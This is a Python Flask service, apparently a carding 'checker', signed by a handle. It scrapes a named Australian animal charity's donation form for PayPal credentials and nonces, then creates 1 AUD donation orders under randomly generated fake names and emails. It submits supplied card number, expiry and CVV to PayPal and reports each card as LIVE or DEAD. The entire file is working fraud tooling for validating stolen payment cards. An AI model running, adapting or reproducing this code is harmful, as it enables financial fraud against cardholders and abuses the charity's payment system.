# Dev : @xoxhunterxd
import requests
import re
import random
import string
import base64
import json
import traceback
from flask import Flask, request, jsonify

app = Flask(__name__)

def generate_random_identity():
    """Generates a high-entropy identity for session initialization."""
    domains = ["mail.in", "gmail.in", "outlook.in", "proton.in", "zoho.in"]
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    return {
        "first": ''.join(random.choices(string.ascii_lowercase, k=8)).capitalize(),
        "last": ''.join(random.choices(string.ascii_lowercase, k=8)).capitalize(),
        "email": f"{prefix}@{random.choice(domains)}"
    }

@app.route('/check', methods=['GET'])
def check_card():
    cc_param = request.args.get('cc')
    
    if not cc_param or cc_param.count('|') != 3:
        return jsonify({"status": "ERROR", "msg": "MALFORMED_INPUT"}), 400

    try:
        # Standardize and validate input payload
        number, month, year_short, cvv = cc_param.split('|')
        month = month.zfill(2)
        year_full = f"20{year_short[-2:]}"
        
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'Accept': 'application/json'
        })

        # PHASE 1: Capture Configuration via Regex
        init_html = session.get('https://animalrights.org.au/donate-now/').text
        form_url_match = re.search(r"data-form-view-url=['\"]([^'\"]+)['\"]", init_html)
        if not form_url_match:
            return jsonify({"status": "ERROR", "msg": "CONFIG_UNAVAILABLE"}), 500
            
        form_url = form_url_match.group(1).replace('&#038;', '&')
        form_html = session.get(form_url).text
        
        # Extraction logic targeting specific keys in the JS context.
        try:
            client_id = re.search(r'["\']clientId["\']\s*:\s*["\']([^"\']+)["\']', form_html).group(1)
            form_id = re.search(r'["\']donationFormId["\']\s*:\s*(\d+)', form_html).group(1)
            nonce = re.search(r'["\']donationFormNonce["\']\s*:\s*["\']([^"\']+)["\']', form_html).group(1)
        except AttributeError:
            return jsonify({"status": "ERROR", "msg": "EXTRACTION_FAILURE"}), 500

        # PHASE 2: OAuth2 Token Generation
        auth_header = base64.b64encode(f"{client_id}:".encode()).decode()
        token_res = session.post(
            'https://www.paypal.com/v1/oauth2/token',
            headers={'Authorization': f'Basic {auth_header}', 'Content-Type': 'application/x-www-form-urlencoded'},
            data='grant_type=client_credentials'
        )
        token_res.raise_for_status()
        access_token = token_res.json().get('access_token')

        # PHASE 3: State-Bound Order Creation
        identity = generate_random_identity()
        order_payload = {
            'action': 'give_paypal_commerce_create_order',
            'give-form-id': form_id,
            'give-form-hash': nonce,
            'give_payment_mode': 'paypal-commerce',
            'give-amount': '1',
            'give_first': identity['first'],
            'give_last': identity['last'],
            'give_email': identity['email'],
            'give-cs-form-currency': 'AUD',
        }
        
        order_res = session.post('https://animalrights.org.au/wp-admin/admin-ajax.php', data=order_payload)
        order_res.raise_for_status()
        order_data = order_res.json()
        
        if not order_data.get('success'):
            return jsonify({"status": "DEAD", "msg": "ORDER_REJECTED", "raw": order_data}), 200
            
        order_id = order_data['data']['id']

        # PHASE 4: Payment Source Confirmation
        # Validating checkout state transition to 'APPROVED'.
        confirm_res = session.post(
            f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
            json={
                "payment_source": {
                    "card": {
                        "number": number,
                        "security_code": cvv,
                        "expiry": f"{year_full}-{month}",
                    }
                }
            }
        )
        
        confirm_data = confirm_res.json()

        # PHASE 5: Engineering-Grade Response Logic
        if confirm_res.status_code == 200 and confirm_data.get('status') == 'APPROVED':
            return jsonify({
                "status": "LIVE",
                "card": cc_param,
                "msg": "APPROVED",
                "dev": "@xoxhunterxd"
            })
        else:
            error_reason = confirm_data.get('details', [{}])[0].get('issue', 'DECLINED')
            return jsonify({
                "status": "DEAD",
                "card": cc_param,
                "msg": error_reason,
                "dev": "@xoxhunterxd"
            })

    except Exception as e:
        return jsonify({
            "status": "EXCEPTION",
            "msg": str(e),
            "trace": traceback.format_exc(),
            "dev": "@xoxhunterxd"
        }), 500

application = app
    
